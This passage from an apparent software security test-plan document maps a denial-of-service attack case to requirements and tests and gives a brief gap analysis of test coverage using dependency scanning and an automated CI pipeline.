| AC-08 | Denial of Service | High | SR-18, SR-30 | TST-18, TST-30 |

**Gap analysis:** Third-party components (SR-32 – SR-36) are fully covered by SCA tooling (OWASP Dependency-Check) rather than functional test cases, which is appropriate since these requirements govern the build pipeline rather than runtime behaviour. No SRs are without a verifiable test; all test pass criteria are concrete and automatable within the JUnit 5 + Testcontainers + ZAP CI pipeline described in §9.1.
